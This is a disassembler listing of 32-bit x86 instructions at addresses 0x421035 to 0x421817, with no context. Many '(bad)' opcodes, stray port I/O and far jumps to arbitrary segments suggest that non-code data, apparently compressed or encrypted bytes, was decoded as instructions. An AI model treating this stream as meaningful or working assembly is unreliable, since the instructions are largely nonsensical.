  421035:	call   DWORD PTR [edi+0x7bd56afe]
  42103b:	jmp    0x7319:0x2492f542
  421042:	adc    eax,0xf3787807
  421047:	cmp    eax,0x3868f38c
  42104c:	add    ch,BYTE PTR [eax-0x69]
  42104f:	mov    esi,0xffff98e3
  421054:	(bad)  
  421055:	call   ebx
  421057:	sbb    eax,0xdd48d3ac
  42105c:	mov    dl,BYTE PTR [eax+0x4]
  42105f:	popw   ss
  421061:	in     al,0xb6
  421063:	aaa    
  421064:	mov    ah,0x30
  421066:	and    ch,BYTE PTR [ecx+0x51a7256c]
  42106c:	fsub   DWORD PTR [ebx]
  42106e:	mov    ebp,DWORD PTR [ebx+0x20]
  421071:	sub    ebp,DWORD PTR [edx-0xdd0e5e0]
  421077:	mov    bh,0xff
  421079:	jmp    FWORD PTR [ebx+0x2f6268ec]
  42107f:	sub    al,0x26
  421081:	sbb    DWORD PTR [edi+0x3fa321a2],eax
  421087:	mov    edx,0x716b439
  42108c:	lods   eax,DWORD PTR ds:[esi]
  42108d:	or     DWORD PTR [edx-0x44fa59d7],ebp
  421093:	pop    edi
  421094:	(bad)  
  421095:	jmp    FWORD PTR [edi-0x2fa62598]
  42109b:	inc    ecx
  42109c:	loop   0x4210ff
  42109e:	jmp    0xe2abfb1b
  4210a3:	dec    esp
  4210a4:	jmp    0x4210f4
  4210a6:	cli    
  4210a7:	jns    0x421095
  4210a9:	pmaddwd mm1,QWORD PTR [ebp-0x4a]
  4210ad:	mov    edi,0x40fe2e5d
  4210b2:	neg    DWORD PTR [edi+ebx*1]
  4210b5:	ret    0xb720
  4210b8:	lds    ebx,FWORD PTR ss:[esi]
  4210bb:	add    eax,esp
  4210bd:	das    
  4210be:	mov    bh,0xcb
  4210c0:	outs   dx,DWORD PTR ds:[esi]
  4210c1:	(bad)  
  4210c2:	sbb    edx,DWORD PTR [edi-0x16ee19ea]
  4210c8:	xor    BYTE PTR [edi],al
  4210ca:	call   0xfbb2aff4
  4210cf:	cld    
  4210d0:	jmp    ebp
  4210d2:	(bad)  
  4210d3:	jp     0x42105b
  4210d5:	dec    edx
  4210d6:	jecxz  0x42113a
  4210d8:	cdq    
  4210d9:	dec    ebp
  4210da:	jmp    0x421146
  4210dc:	nop
  4210dd:	inc    esp
  4210de:	fwait
  4210df:	dec    edi
  4210e0:	fwait
  4210e1:	sbb    ah,dl
  4210e3:	push   es
  4210e4:	mov    ds:0xab2ca522,eax
  4210e9:	sub    ch,BYTE PTR [ecx+eax*1-0x4089a341]
  4210f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210f1:	or     DWORD PTR [ebx-0x5ef041c6],edi
  4210f7:	add    BYTE PTR [eax-0x2f9c5ce9],ch
  4210fd:	sbb    bl,BYTE PTR [edx-0x92b5]
  421103:	jae    0x4210b3
  421105:	(bad)  
  421106:	fnsave [ebx-0x2e]
  421109:	jp     0x4210d8
  42110b:	stos   BYTE PTR es:[edi],al
  42110c:	out    0xaa,al
  42110e:	pusha  
  42110f:	nop
  421110:	ins    DWORD PTR es:[edi],dx
  421111:	mov    ah,0x78
  421113:	rcr    eax,cl
  421115:	int3   
  421116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421117:	outs   dx,DWORD PTR ds:[esi]
  421118:	cld    
  421119:	(bad)  
  42111a:	jmp    FWORD PTR [edx-0x7]
  42111d:	test   al,0x60
  42111f:	shr    DWORD PTR [esi+0x3698cb5e],cl
  421125:	imul   esi,DWORD PTR [ecx+ecx*2],0xffffffba
  421129:	repz ss jnp 0x42111e
  42112d:	or     eax,DWORD PTR [edx+0x1b76e545]
  421133:	jns    0x4210d4
  421135:	(bad)  
  421136:	(bad)  
  421137:	(bad)  
  421138:	(bad)  
  421139:	fcom   QWORD PTR [esi+0x5c]
  42113c:	add    DWORD PTR [ebp-0x6b],esi
  42113f:	rcr    BYTE PTR [edx+0x50],cl
  421142:	or     al,BYTE PTR [eax]
  421144:	cmp    ebp,DWORD PTR [eax+0x6ae27bc7]
  42114a:	pop    esp
  42114b:	ss inc eax
  42114d:	sub    bh,BYTE PTR [eax+0x44]
  421150:	sub    al,BYTE PTR [eax+0x56]
  421153:	test   eax,0xea13089
  421158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421159:	(bad)  
  42115a:	(bad)  
  42115b:	inc    DWORD PTR [edx]
  42115d:	xchg   ebp,eax
  42115e:	or     DWORD PTR [ecx+esi*1],esi
  421161:	in     eax,0x8b
  421163:	aaa    
  421164:	test   eax,0x91139e6
  421169:	cmp    al,0x2f
  42116b:	and    BYTE PTR [eax],bh
  42116d:	aas    
  42116e:	and    eax,0x1d083f23
  421173:	add    eax,DWORD PTR [edi]
  421175:	(bad)  
  421176:	(bad)  
  421177:	(bad)  
  421178:	jmp    DWORD PTR [eax]
  42117a:	pop    ss
  42117b:	and    cl,BYTE PTR [eax]
  42117d:	sbb    DWORD PTR [ecx],edi
  42117f:	and    BYTE PTR ss:[edx],dl
  421182:	sub    al,0x47
  421184:	imul   ecx,DWORD PTR [ebx+eiz*2+0x67],0x4c607e53
  42118c:	pop    esi
  42118d:	data16 jl 0x4211f0
  421190:	pop    eax
  421191:	arpl   WORD PTR [edi+0x5e],si
  421194:	imul   ebp,DWORD PTR [eax+0x6b],0x6c
  421198:	add    dh,bh
  42119a:	(bad)  
  42119b:	(bad)  
  42119c:	push   DWORD PTR [edx]
  42119e:	or     eax,0x373a041c
  4211a3:	and    DWORD PTR [eax],esp
  4211a5:	adc    eax,0x1a0e1009
  4211aa:	xor    bh,BYTE PTR [ebx+ecx*1]
  4211ad:	or     esp,DWORD PTR [ebp+0x79]
  4211b0:	cmp    al,0x4b
  4211b2:	inc    ebx
  4211b3:	inc    ebp
  4211b4:	jge    0x421208
  4211b6:	inc    ebx
  4211b7:	pop    ebp
  4211b8:	add    eax,0xffffff07
  4211bd:	jg     0x421191
  4211bf:	push   cs
  4211c0:	pop    ss
  4211c1:	dec    esp
  4211c2:	jmp    0x4211f9
  4211c4:	mov    al,ds:0x7dd6645a
  4211c9:	push   es
  4211ca:	aaa    
  4211cb:	push   0x62
  4211cd:	and    DWORD PTR [ebx+0x11],esi
  4211d0:	mov    bh,0x4a
  4211d2:	xor    esp,DWORD PTR [ebp-0x38]
  4211d5:	xchg   ecx,eax
  4211d6:	das    
  4211d7:	sbb    dh,BYTE PTR [edi]
  4211d9:	push   0xfffffff3
  4211db:	mov    ch,BYTE PTR [edi-0x1]
  4211de:	(bad)  
  4211df:	(bad)  
  4211e0:	jmp    FWORD PTR [ecx+0x2a]
  4211e3:	cld    
  4211e4:	shl    DWORD PTR [edi],cl
  4211e6:	push   esi
  4211e7:	test   al,0x54
  4211e9:	mov    bh,0x96
  4211eb:	pop    ebx
  4211ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211ed:	mov    bh,0x56
  4211ef:	or     ch,BYTE PTR [esi]
  4211f1:	mov    ds:0xa1ea18b3,al
  4211f6:	jl     0x421224
  4211f8:	jnp    0x4211d4
  4211fa:	repz aad 0xc8
  4211fd:	xchg   esp,eax
  4211fe:	out    dx,eax
  4211ff:	or     bh,BYTE PTR [edi-0x1]
  421202:	(bad)  
  421203:	(bad)  
  421204:	dec    DWORD PTR [ecx-0x16]
  421207:	dec    esp
  421208:	jae    0x421234
  42120a:	add    esi,ebp
  42120c:	push   esi
  42120d:	les    esi,FWORD PTR [ebx]
  42120f:	jp     0x42128b
  421211:	mov    ebp,0xcf183154
  421216:	mov    ds:0xac49fc3c,al
  42121b:	sahf   
  42121c:	push   cs
  42121d:	test   BYTE PTR [ebx],dl
  42121f:	dec    ebp
  421220:	push   ebx
  421221:	outs   dx,BYTE PTR ds:[esi]
  421222:	mov    esp,0xffff213f
  421227:	(bad)  
  421228:	(bad)  
  421229:	cmp    BYTE PTR [ebx],bl
  42122b:	cmp    eax,0x8f2aefa5
  421230:	xor    ecx,edi
  421232:	out    0x10,al
  421234:	fist   DWORD PTR [ecx-0x60]
  421237:	xchg   BYTE PTR [edi-0x42],bl
  42123a:	leave  
  42123b:	ins    DWORD PTR es:[edi],dx
  42123c:	test   eax,0x632b6201
  421241:	push   ds
  421242:	leave  
  421243:	cs sub ecx,ebp
  421246:	adc    bl,BYTE PTR [ebx]
  421248:	and    edi,edi
  42124a:	(bad)  
  42124b:	(bad)  
  42124c:	push   DWORD PTR [edx-0x3b]
  42124f:	mov    ds:0x5a372565,eax
  421254:	push   esp
  421255:	pop    ebx
  421256:	cmp    eax,0x2fe14f9c
  42125b:	mov    ds:0x83f28b67,eax
  421260:	test   al,0x9e
  421262:	pop    edi
  421263:	clc    
  421264:	push   edi
  421265:	repz into 
  421267:	fsubr  st(7),st
  421269:	cmp    eax,0xffd31ff4
  42126e:	(bad)  
  42126f:	(bad)  
  421270:	dec    DWORD PTR [eax]
  421272:	imul   ebp,DWORD PTR [eax],0x23e8dbf6
  421278:	not    bl
  42127a:	mov    BYTE PTR [ebx],bl
  42127c:	jne    0x421242
  42127e:	and    DWORD PTR [ebp-0x36939c68],eax
  421284:	lock dec ebp
  421286:	jge    0x42124e
  421288:	aad    0xf6
  42128a:	mov    bl,0x36
  42128c:	or     BYTE PTR [esp+edx*2],ah
  42128f:	shl    DWORD PTR [eax-0x1],0xff
  421293:	(bad)  
  421294:	dec    DWORD PTR [ebx-0x6557a659]
  42129a:	inc    eax
  42129b:	icebp  
  42129c:	pusha  
  42129d:	cmp    eax,ebp
  42129f:	jns    0x4212c9
  4212a1:	enter  0xe11d,0xd0
  4212a5:	popa   
  4212a6:	push   esi
  4212a7:	xor    BYTE PTR [esi+0x4af2a78c],dl
  4212ad:	push   esp
  4212ae:	ss nop
  4212b0:	test   al,0x9d
  4212b2:	js     0x4212ef
  4212b4:	mov    esi,0xfffffff2
  4212b9:	and    al,0xb6
  4212bb:	mov    ebp,DWORD PTR [edi+0x2e88304e]
  4212c1:	push   esp
  4212c2:	leave  
  4212c3:	cmp    DWORD PTR [eax],ebp
  4212c5:	push   ebp
  4212c6:	fidivr WORD PTR [eax+0x1e]
  4212c9:	xchg   esp,eax
  4212ca:	das    
  4212cb:	jp     0x42128f
  4212cd:	enter  0x84e2,0x8e
  4212d1:	cdq    
  4212d2:	and    al,0xe3
  4212d4:	mov    ds:0xfff9685e,al
  4212d9:	(bad)  
  4212da:	jmp    0x4212a6
  4212dc:	add    BYTE PTR [edx+eiz*8+0x2cfd4dc8],al
  4212e3:	pop    ebp
  4212e4:	bound  esi,QWORD PTR [ebx+0x75]
  4212e7:	dec    esi
  4212e8:	jo     0x42134c
  4212ea:	(bad)  
  4212eb:	jg     0x421276
  4212ed:	add    BYTE PTR [eax+0x64],ch
  4212f0:	pop    edi
  4212f1:	bound  eax,QWORD PTR [eax+0x22]
  4212f4:	sbb    eax,DWORD PTR ss:[edx-0x7c]
  4212f8:	add    al,0xa2
  4212fa:	xor    ah,al
  4212fc:	dec    ebp
  4212fd:	jg     0x4212fa
  4212ff:	(bad)  
  421300:	(bad)  
  421301:	jl     0x4212a4
  421303:	and    al,BYTE PTR [edx+eiz*1-0x2f6410ae]
  42130a:	fnsave [ecx+0x37d92e19]
  421310:	xchg   edx,eax
  421311:	out    0xdd,al
  421313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421314:	mov    esi,0x6b78b2c7
  421319:	aad    0xd1
  42131b:	mov    ecx,0xffffff1d
  421320:	inc    DWORD PTR [esi]
  421322:	push   0x91fdee3b
  421327:	sub    DWORD PTR [edi],esp
  421329:	adc    al,0xf7
  42132b:	mov    edi,0x2b31ddf5
  421330:	xor    al,0xd7
  421332:	lods   al,BYTE PTR ds:[esi]
  421333:	adc    DWORD PTR [ebp-0x7cafa823],esi
  421339:	fst    DWORD PTR [ecx-0xf]
  42133c:	push   ebp
  42133d:	jne    0x421397
  42133f:	jecxz  0x42136b
  421341:	sbb    edx,DWORD PTR [ecx+0x6c]
  421344:	std    
  421345:	dec    ebp
  421346:	shl    DWORD PTR [ecx+0x6b],1
  421349:	je     0x421322
  42134b:	add    eax,DWORD PTR [ecx+0x6d]
  42134e:	inc    ebx
  42134f:	(bad)  
  421350:	in     eax,dx
  421351:	call   DWORD PTR [esi]
  421353:	mov    ds:0x44da7169,al
  421358:	mov    bh,0xf9
  42135a:	in     eax,0xbd
  42135c:	pop    ecx
  42135d:	xlat   BYTE PTR ds:[ebx]
  42135e:	push   es
  42135f:	retf   0xe5c9
  421362:	lea    ebx,[edi-0xf245478]
  421368:	(bad)  
  421369:	(bad)  
  42136a:	(bad)  
  42136b:	jmp    0xf0c9b939
  421370:	fisttp DWORD PTR [eax]
  421372:	popf   
  421373:	stc    
  421374:	leave  
  421375:	es aam 0xa7
  421378:	(bad)  
  421379:	rol    BYTE PTR [edi+esi*8+0x6f],cl
  42137d:	cmp    BYTE PTR [edi+0x42],dl
  421380:	push   ebx
  421381:	stos   BYTE PTR es:[edi],al
  421382:	daa    
  421383:	cli    
  421384:	jb     0x4213e5
  421386:	(bad)  
  421387:	(bad)  
  421388:	(bad)  
  421389:	(bad)  
  42138a:	mov    edi,0x1a57c71e
  42138f:	add    al,0x62
  421391:	xlat   BYTE PTR ds:[ebx]
  421392:	inc    edx
  421393:	xlat   BYTE PTR ds:[ebx]
  421394:	in     eax,dx
  421395:	addr16 mov edx,0x12e70d96
  42139b:	sbb    edx,edi
  42139d:	ja     0x421379
  42139f:	dec    eax
  4213a0:	jge    0x421339
  4213a2:	or     BYTE PTR [ebx+0x7a3a6702],0x3a
  4213a9:	(bad)  
  4213aa:	(bad)  
  4213ab:	jmp    FWORD PTR [edi+0x1f]
  4213ae:	std    
  4213af:	cmp    ebp,DWORD PTR [edx+ebx*8-0x3f]
  4213b3:	sbb    edx,edx
  4213b5:	add    dh,BYTE PTR ds:0xa96aee5b
  4213bb:	shl    BYTE PTR [edi+0x7ec0bc8a],cl
  4213c1:	les    esp,FWORD PTR [esi+0x67429c5b]
  4213c7:	fwait
  4213c8:	out    dx,al
  4213c9:	clc    
  4213ca:	fbld   TBYTE PTR [eax-0x55]
  4213cd:	sbb    DWORD PTR [ebx+0x78],ebx
  4213d0:	loopne 0x42143a
  4213d2:	inc    ebx
  4213d3:	push   cs
  4213d4:	adc    BYTE PTR [ebx+ecx*8+0x5e],bl
  4213d8:	(bad)  
  4213da:	outs   dx,DWORD PTR ds:[esi]
  4213db:	std    
  4213dc:	mov    edi,0x39291dd
  4213e1:	loopne 0x421408
  4213e3:	rol    BYTE PTR [ebx-0x12],cl
  4213e6:	ins    BYTE PTR es:[edi],dx
  4213e7:	inc    esp
  4213e8:	stos   DWORD PTR es:[edi],eax
  4213e9:	mov    esi,0xe53dbb7
  4213ee:	(bad)  
  4213ef:	retf   
  4213f0:	jle    0x4213f1
  4213f2:	(bad)  
  4213f3:	(bad)  
  4213f4:	jmp    ecx
  4213f6:	mov    bl,0x2e
  4213f8:	fstp   st(5)
  4213fa:	and    eax,0x588e0d9e
  4213ff:	cs jge 0x421481
  421402:	and    DWORD PTR [esi+0x6ed290cd],edi
  421408:	fst    QWORD PTR [ecx+0x64]
  42140b:	push   ds
  42140c:	or     eax,0xbd6efc32
  421411:	mov    bl,0x65
  421413:	dec    BYTE PTR [ebp-0x1]
  421416:	jmp    FWORD PTR [edi]
  421418:	lock aam 0xc1
  42141b:	outs   dx,BYTE PTR ds:[esi]
  42141c:	sbb    eax,0xc54d15f7
  421421:	nop
  421422:	stos   DWORD PTR es:[edi],eax
  421423:	mov    ebp,0x1d2770ec
  421428:	adc    cl,bh
  42142a:	sbb    ah,BYTE PTR cs:0x3f03e7d8
  421431:	(bad)  
  421432:	jmp    FWORD PTR [edi-0x4]
  421435:	mov    ah,0x2e
  421437:	cmp    eax,0x3fe783c9
  42143c:	cmp    ch,BYTE PTR [ebp-0x1a]
  42143f:	scas   eax,DWORD PTR es:[edi]
  421440:	ret    
  421441:	addr16 jl 0x4214aa
  421444:	test   DWORD PTR [edi+0x4143af83],edi
  42144a:	ds jmp 0xb7d14033
  421450:	(bad)  
  421451:	(bad)  
  421452:	(bad)  
  421453:	sti    
  421454:	jl     0x421460
  421456:	(bad)  
  421458:	pop    ds
  421459:	mov    ebx,0xa91ef41f
  42145e:	dec    eax
  42145f:	adc    ecx,DWORD PTR [edi-0x4eedecd5]
  421465:	jns    0x42149e
  421467:	inc    ebx
  421468:	jg     0x421458
  42146a:	push   es
  42146b:	push   ecx
  42146c:	or     eax,0xfffc001a
  421471:	(bad)  
  421472:	dec    DWORD PTR [edi-0x75b53bcb]
  421478:	in     al,dx
  421479:	or     cl,BYTE PTR [edx-0x579419ed]
  42147f:	mov    edx,0xfcd9d8dc
  421484:	jl     0x421440
  421486:	call   0xeb05cc15
  42148b:	jecxz  0x421439
  42148d:	retf   0x7ce8
  421490:	in     eax,0xff
  421492:	aaa    
  421493:	or     cl,BYTE PTR [ebx]
  421495:	cmp    ah,bl
  421497:	out    0xbc,al
  421499:	adc    eax,0x65fbe304
  42149e:	mov    ah,0x5a
  4214a0:	sbb    eax,0xffff3485
  4214a5:	(bad)  
  4214a7:	xchg   ecx,eax
  4214a8:	(bad)  
  4214a9:	adc    eax,0x952c3864
  4214ae:	add    al,0x9f
  4214b0:	mov    esi,0xa54ad6cd
  4214b5:	push   esp
  4214b6:	lods   eax,DWORD PTR ds:[esi]
  4214b7:	mov    WORD PTR ds:0xd53f3484,?
  4214bd:	(bad)  
  4214be:	fld    TBYTE PTR [esi-0xed8bdb]
  4214c4:	(bad)  
  4214c5:	push   DWORD PTR [edi-0x4776e0e4]
  4214cb:	adc    eax,0xd9857c90
  4214d0:	dec    eax
  4214d1:	add    DWORD PTR [ecx+esi*2],ebx
  4214d4:	and    al,dl
  4214d6:	add    eax,0x45e01aa0
  4214db:	scas   al,BYTE PTR es:[edi]
  4214dc:	push   esi
  4214dd:	mov    ch,0xc0
  4214df:	daa    
  4214e0:	inc    ebp
  4214e1:	jo     0x42151e
  4214e3:	(bad)  
  4214e4:	(bad)  
  4214e5:	(bad)  
  4214e6:	call   FWORD PTR [eax+0x39a1b912]
  4214ec:	jmp    0x62c:0x4f07d6c9
  4214f3:	dec    ecx
  4214f4:	pop    ds
  4214f5:	xor    bl,dh
  4214f7:	push   ebp
  4214f8:	fild   WORD PTR [esi+0x1c44917f]
  4214fe:	mov    al,ds:0xb596c4ae
  421503:	cld    
  421504:	ret    0x5971
  421507:	mov    cl,0xf5
  421509:	mov    edi,0x30bab9f4
  42150e:	push   ebx
  42150f:	dec    edx
  421510:	sbb    DWORD PTR ds:0x6a730801,0x5719135
  42151a:	ud0    ebx,edi
  42151d:	cli    
  42151e:	mov    edi,0xa431d561
  421523:	add    al,0xdf
  421525:	jo     0x4214c0
  421527:	mov    ch,0x55
  421529:	pop    edi
  42152a:	xchg   edi,eax
  42152b:	jne    0x42157e
  42152d:	mov    ecx,0xfb980595
  421532:	pop    esi
  421533:	fmul   st(0),st
  421535:	repz xlat BYTE PTR ds:[ebx]
  421537:	(bad)  
  421538:	(bad)  
  421539:	(bad)  
  42153a:	inc    DWORD PTR [eax]
  42153c:	cwde   
  42153d:	imul   ecx,DWORD PTR [eax+0x715348bf],0xffffffe1
  421544:	clc    
  421545:	fstp   TBYTE PTR [edx+0x33532845]
  42154b:	pop    edi
  42154c:	or     al,0x27
  42154e:	sbb    BYTE PTR [esp+eiz*4-0x33bab659],cl
  421555:	daa    
  421556:	mov    edx,0xb271403
  42155b:	call   0x273d955f
  421560:	int3   
  421561:	out    0x9d,eax
  421563:	retf   0x1bce
  421566:	stos   DWORD PTR es:[edi],eax
  421567:	xchg   esi,eax
  421568:	xchg   edx,eax
  421569:	sbb    al,0x7a
  42156b:	fmul   st,st(2)
  42156d:	fisttp QWORD PTR [eax-0x3593ed45]
  421573:	retf   0x32d3
  421576:	(bad)  
  421578:	(bad)  
  421579:	fild   QWORD PTR [ebx-0x1e0e039e]
  42157f:	adc    BYTE PTR [ecx],al
  421581:	shr    BYTE PTR [eax+0x12],cl
  421584:	stc    
  421585:	add    edx,DWORD PTR [esi]
  421587:	xchg   sp,ax
  421589:	xor    dh,BYTE PTR [ecx+0x65]
  42158c:	(bad)  
  42158d:	mov    edi,0xfa55dfc5
  421592:	aam    0xb2
  421594:	mov    ah,0xcb
  421596:	push   0xfffffff2
  421598:	call   0xdaf5:0x98b122b4
  42159f:	mov    eax,0x66ab029a
  4215a4:	call   0x3f2c:0xb7e5f97e
  4215ab:	daa    
  4215ac:	popf   
  4215ad:	push   0x736402e3
  4215b2:	adc    bh,ah
  4215b4:	sub    BYTE PTR [eax+0x51],ah
  4215b7:	adc    BYTE PTR [ecx],ch
  4215b9:	push   edx
  4215ba:	jmp    FWORD PTR ds:0x28ff5f96
  4215c0:	es (bad) 
  4215c2:	je     0x421641
  4215c4:	imul   edx,DWORD PTR [edi],0x5f
  4215c7:	adc    al,0xa4
  4215c9:	dec    ebp
  4215ca:	push   esi
  4215cb:	dec    eax
  4215cc:	scas   al,BYTE PTR es:[edi]
  4215cd:	pop    ss
  4215ce:	jle    0x4215b1
  4215d0:	push   DWORD PTR [ebp-0x3139f496]
  4215d6:	test   DWORD PTR [ecx+0x6001d632],ebp
  4215dc:	js     0x4215a1
  4215de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215df:	xor    al,BYTE PTR [ecx]
  4215e1:	inc    ecx
  4215e2:	xchg   bh,ah
  4215e4:	jecxz  0x4215e5
  4215e6:	das    
  4215e7:	std    
  4215e8:	div    dh
  4215ea:	inc    ecx
  4215eb:	push   esi
  4215ec:	mov    ecx,DWORD PTR ds:0xadb9dada
  4215f2:	call   DWORD PTR [ebx]
  4215f4:	out    0xee,eax
  4215f6:	mov    DWORD PTR [edx+0x308b6fcb],edi
  4215fc:	call   0xfffe:0xb7ffaf69
  421603:	lahf   
  421604:	cmp    ebx,edi
  421606:	test   BYTE PTR [esi+0x2f132f79],ch
  42160c:	dec    ebx
  42160d:	ret    
  42160e:	ret    0x461
  421611:	daa    
  421612:	xor    esp,DWORD PTR [ebx-0x3c16feda]
  421618:	daa    
  421619:	adc    edi,DWORD PTR [edi-0x340eefe]
  42161f:	repnz (bad) 
  421622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421623:	aas    
  421624:	pop    esi
  421625:	es jno 0x4215f7
  421628:	mov    esi,DWORD PTR [edx+0x4a]
  42162b:	test   eax,0x6e7daf8e
  421630:	cdq    
  421631:	sti    
  421632:	pop    ebx
  421633:	(bad)  
  421634:	dec    ebx
  421636:	das    
  421637:	adc    BYTE PTR [edx-0x57],bh
  42163a:	les    ebp,FWORD PTR [edi+0x1d]
  42163d:	outs   dx,BYTE PTR ds:[esi]
  42163e:	fstp   DWORD PTR [ecx+0xf]
  421641:	xchg   ebx,eax
  421642:	aaa    
  421643:	dec    edi
  421644:	inc    ebp
  421645:	loopne 0x421684
  421647:	data16 sbb al,0x2e
  42164a:	mov    al,ds:0xffff0657
  42164f:	(bad)  
  421650:	call   DWORD PTR ds:0xb83c2640
  421656:	xor    eax,eax
  421658:	inc    edx
  421659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42165a:	shl    BYTE PTR [esi],0xa2
  42165d:	aaa    
  42165e:	ret    0x8c5a
  421661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421662:	rcl    cl,0xc5
  421665:	clc    
  421666:	imul   edi,DWORD PTR [esi-0x50251974],0xffffff86
  42166d:	mov    eax,cs
  42166f:	scas   al,BYTE PTR es:[edi]
  421670:	mov    ebx,cs
  421672:	(bad)  
  421673:	(bad)  
  421674:	jmp    FWORD PTR [ecx]
  421676:	cdq    
  421677:	test   al,0xa1
  421679:	pop    esi
  42167a:	cmp    BYTE PTR [esi+0x4abaeffc],bl
  421680:	sbb    al,0x6e
  421682:	enter  0xc5f2,0x20
  421686:	cmp    esp,esi
  421688:	jl     0x421688
  42168a:	hlt    
  42168b:	out    0x6,eax
  42168d:	add    al,al
  42168f:	sti    
  421690:	das    
  421691:	mov    edi,0x1001f2fc
  421696:	and    eax,0x7227a6e6
  42169b:	out    0x8c,al
  42169d:	mov    edx,0xeee768c5
  4216a2:	xor    BYTE PTR [edi-0xd00007a],ch
  4216a8:	retf   
  4216a9:	in     al,0xd8
  4216ab:	adc    BYTE PTR [ecx+0x112ee968],bh
  4216b1:	scas   eax,DWORD PTR es:[edi]
  4216b2:	pop    edx
  4216b3:	rcl    BYTE PTR [ecx+0x4d],cl
  4216b6:	sub    eax,0xc23f5c41
  4216bb:	xor    eax,0xb636915
  4216c0:	(bad)  
  4216c1:	(bad)  
  4216c3:	push   esp
  4216c4:	sysret 
  4216c6:	jno    0x42169d
  4216c8:	inc    ebp
  4216c9:	fcmovbe st,st(0)
  4216cb:	add    DWORD PTR [edi],esi
  4216cd:	jg     0x421697
  4216cf:	seto   ch
  4216d2:	cmp    ebx,esp
  4216d4:	xor    eax,0xd9d2bbc3
  4216d9:	jg     0x42165e
  4216db:	(bad)  
  4216dc:	(bad)  
  4216dd:	jge    0x421729
  4216df:	xor    eax,0xe9ba326b
  4216e4:	xchg   ebx,eax
  4216e5:	(bad)  
  4216e6:	xor    esp,ecx
  4216e8:	and    ebx,DWORD PTR [ebx-0x2246e6ec]
  4216ee:	sti    
  4216ef:	dec    ebx
  4216f0:	xchg   edx,eax
  4216f1:	cli    
  4216f2:	sub    DWORD PTR [ebx-0x42],edx
  4216f8:	push   DWORD PTR [ebx+0x2f]
  4216fb:	fisub  WORD PTR [ebx-0x2a66461]
  421701:	xchg   ebp,eax
  421702:	push   0xffffffad
  421704:	jnp    0x42171c
  421706:	mov    edx,0x239ac3c9
  42170b:	sub    ebp,edx
  42170d:	jmp    0x6cdf9556
  421712:	or     dh,cl
  421714:	ins    DWORD PTR es:[edi],dx
  421715:	sub    edi,0x22
  421718:	shl    DWORD PTR [ebx+0x10ffffe2],0xea
  42171f:	push   ecx
  421720:	in     al,dx
  421721:	retf   0xa339
  421724:	jbe    0x421770
  421726:	mov    ecx,0x2812a7b
  42172b:	add    BYTE PTR [ebx],dl
  42172d:	rol    esp,0xa2
  421730:	xchg   edi,eax
  421731:	(bad)  
  421732:	call   FWORD PTR [edi+0x7a]
  421735:	and    BYTE PTR [edi+0x5763deea],al
  42173b:	mov    dh,0xef
  42173d:	mov    WORD PTR [esi-0x4ba282b0],?
  421743:	fdiv   DWORD PTR [esi-0x24]
  421746:	mov    esi,0xe49a4f26
  42174b:	push   eax
  42174c:	idiv   bh
  42174e:	(bad)  
  42174f:	(bad)  
  421750:	dec    DWORD PTR [ebx+eax*1+0x79]
  421754:	int3   
  421755:	movd   mm6,eax
  421758:	push   esi
  421759:	pop    esi
  42175a:	push   edi
  42175b:	neg    BYTE PTR [eax]
  42175d:	je     0x42176d
  42175f:	xor    BYTE PTR [ebp+0x364d7435],ah
  421765:	push   esp
  421766:	dec    esi
  421767:	adc    bh,BYTE PTR [edi-0x7e]
  42176a:	cmp    al,0xd0
  42176c:	mov    dh,0x54
  42176e:	fimul  WORD PTR [ecx-0x44]
  421771:	retf   
  421772:	outs   dx,DWORD PTR ds:[esi]
  421773:	(bad)  
  421774:	dec    ebp
  421776:	sahf   
  421777:	mov    al,0xd6
  421779:	fcom   st(7)
  42177b:	test   BYTE PTR [edx+0x3ff09ebc],0xbd
  421782:	xchg   esp,eax
  421783:	inc    edi
  421784:	(bad)  
  421785:	aas    
  421786:	cmp    ch,BYTE PTR [edi-0x4eefb166]
  42178c:	(bad)  
  42178d:	(bad)  
  42178e:	push   edx
  421790:	push   ds
  421791:	mov    WORD PTR [eax+0x2e],cs
  421794:	jmp    FWORD PTR [edx]
  421796:	not    BYTE PTR [ebp+0x27]
  421799:	outs   dx,BYTE PTR ds:[esi]
  42179a:	xchg   BYTE PTR [ecx+0x26],al
  42179d:	push   edi
  42179e:	sbb    eax,0x2311dfed
  4217a3:	cmp    al,0xdc
  4217a5:	lahf   
  4217a6:	inc    ecx
  4217a7:	sbb    BYTE PTR [esi+eax*8],dl
  4217aa:	dec    esp
  4217ab:	(bad)  
  4217ac:	(bad)  
  4217ad:	(bad)  
  4217ae:	jmp    FWORD PTR [ebx-0x777e82da]
  4217b4:	rcr    BYTE PTR [eax-0x3c],cl
  4217b7:	sbb    al,0xb8
  4217b9:	test   al,0x88
  4217bb:	jae    0x4217c2
  4217bd:	fsubr  QWORD PTR [eax-0x7d4867ae]
  4217c3:	ret    
  4217c4:	enter  0x4da3,0x4
  4217c8:	xor    eax,0xc8fbd468
  4217cd:	imul   ecx,DWORD PTR [esi],0x6f
  4217d0:	add    eax,0x2fd3fff1
  4217d5:	fwait
  4217d6:	mul    BYTE PTR [edx+0x7485e331]
  4217dc:	jo     0x4217b2
  4217de:	mov    bl,0x72
  4217e0:	mov    bl,ch
  4217e2:	adc    DWORD PTR [edi],0x695542fa
  4217e8:	push   ebp
  4217e9:	mov    WORD PTR [ebx],cs
  4217eb:	sub    edx,edi
  4217ed:	mov    BYTE PTR [ebx-0x1],bl
  4217f0:	dec    DWORD PTR [ebx-0x3]
  4217f3:	xchg   esi,eax
  4217f4:	das    
  4217f5:	xor    edx,DWORD PTR [ebp+0x38]
  4217f8:	push   ss
  4217f9:	mov    dl,0xc5
  4217fb:	sbb    al,0x56
  4217fd:	je     0x4217bd
  4217ff:	fidiv  DWORD PTR [esi]
  421801:	jo     0x421857
  421803:	es out 0x45,eax
  421806:	je     0x42182a
  421808:	or     al,0x42
  42180a:	fstp   DWORD PTR [edi-0x6]
  42180d:	(bad)  
  42180e:	(bad)  
  42180f:	fisub  DWORD PTR [esi+0x49c66460]
  421815:	sub    ecx,ecx
  421817:	pop    ecx
